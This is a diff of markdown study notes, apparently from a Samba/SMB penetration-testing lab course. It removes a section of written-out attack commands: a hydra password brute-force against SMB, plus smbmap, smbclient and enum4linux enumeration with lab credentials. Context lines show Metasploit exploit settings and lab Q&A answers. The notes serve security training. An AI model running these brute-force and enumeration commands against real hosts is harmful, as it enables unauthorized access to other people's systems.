@@ -69,11 +69,6 @@ Ports:
      - __`net view <ip_of_the_subnet>`__
      - __`net use D: \\<subip>\Documents`__
 
-
-
-
-
-
  
 # Q&A
 - __1.What is the primary purpose of SMB in Windows networks?__
@@ -102,37 +97,6 @@ set LHOST ech1
 set session 1
 exploit
 ```
-
-# Exploiting SAMBA
-
-
-__1. Brup force attack on SAMBA__
-- __`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 smb`__
-
-__2. smbmap__
-__`smbmap -H demo.ine.local -u admin -p password1`__
-  - __It will display the user's and  permissions__
-
-__3.smbclient__
-__`smbclient //demo.ine.local/shawn -U admin`__
-  - __it will connect the server like a ftp__
-  - __`shawn` is a user__
-  - __`-U admin` authenticate as a admin mean you can login using admin logs__
-
-__4. enum4linux__
-__`enum4linux -a -u admin -p password1`__
-
-- __1. Target information__
-- __2. Users__
-- __3. SID of the users__
-
-
-
-
-
-
-
-
 
 
 
@@ -164,7 +128,7 @@ exploit
 
 
 # samba
-
+```
 1. Find the OS version of samba server using rpcclient.
 Ans. 
 `rpcclient -U "" -N 10.0.1.22`
@@ -273,7 +237,7 @@ Ans. SAMBA-RECON
 
 2. Find SID of user “admin” using rpcclient?
 Ans. S-1-5-21-4056189605-2085045094-1961111545-1005
-
+```
 
 
 
